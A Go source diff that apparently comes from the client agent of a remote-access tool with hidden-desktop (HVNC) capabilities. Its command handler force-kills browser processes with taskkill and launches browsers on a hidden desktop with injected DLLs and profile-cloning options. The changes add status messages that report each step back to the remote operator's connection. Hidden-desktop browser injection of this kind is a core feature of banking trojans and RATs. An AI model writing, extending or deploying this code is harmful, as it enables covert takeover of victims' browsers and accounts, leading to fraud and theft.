@@ -4,9 +4,11 @@ import (
 	"context"
 	"encoding/json"
 	"errors"
+	"fmt"
 	"log"
 	"os"
 	"os/exec"
+	"path/filepath"
 	goruntime "runtime"
 	"strconv"
 	"strings"
@@ -1511,12 +1513,29 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		log.Printf("hvnc: start process %q (kill_exe=%q opera_patch=%v)", filePath, killExe, operaPatch)
 		sendCommandResultSafe(env, cmdID, true, "")
 		goSafe("hvnc_start_process", nil, func() {
+			sendLaunchStatus := func(step string, success bool, detail string) {
+				_ = wire.WriteMsg(context.Background(), env.Conn, wire.HVNCBrowserLaunchStatus{
+					Type:    "hvnc_browser_launch_status",
+					Browser: filepath.Base(strings.Trim(filePath, `"`)),
+					Step:    step,
+					Success: success,
+					Detail:  detail,
+				})
+			}
 			if killExe != "" {
+				sendLaunchStatus("kill", true, "killing "+killExe)
 				out, err := exec.Command("taskkill", "/f", "/im", killExe).CombinedOutput()
 				log.Printf("hvnc: taskkill /f /im %s: %s (err=%v)", killExe, strings.TrimSpace(string(out)), err)
+				if err != nil {
+					sendLaunchStatus("kill", false, fmt.Sprintf("taskkill failed: %s", strings.TrimSpace(string(out))))
+				}
 			}
+			sendLaunchStatus("launch", true, fmt.Sprintf("starting %s", filePath))
 			if err := capture.StartHVNCProcess(filePath, operaPatch); err != nil {
 				log.Printf("hvnc: start process failed for %q: %v", filePath, err)
+				sendLaunchStatus("launch", false, fmt.Sprintf("failed: %v", err))
+			} else {
+				sendLaunchStatus("launch", true, "process created")
 			}
 		})
 		return nil
@@ -1723,7 +1742,16 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 					Message: message,
 				})
 			}
-			if err := capture.StartHVNCBrowserInjected(browser, exePath, dllBytes, captureDllBytes, clone, cloneLite, killIfRunning, onProgress, onDXGIStatus); err != nil {
+			onLaunchStatus := func(step string, success bool, detail string) {
+				_ = wire.WriteMsg(context.Background(), env.Conn, wire.HVNCBrowserLaunchStatus{
+					Type:    "hvnc_browser_launch_status",
+					Browser: browser,
+					Step:    step,
+					Success: success,
+					Detail:  detail,
+				})
+			}
+			if err := capture.StartHVNCBrowserInjected(browser, exePath, dllBytes, captureDllBytes, clone, cloneLite, killIfRunning, onProgress, onDXGIStatus, onLaunchStatus); err != nil {
 				log.Printf("hvnc: browser injected failed for %q: %v", browser, err)
 			}
 		})
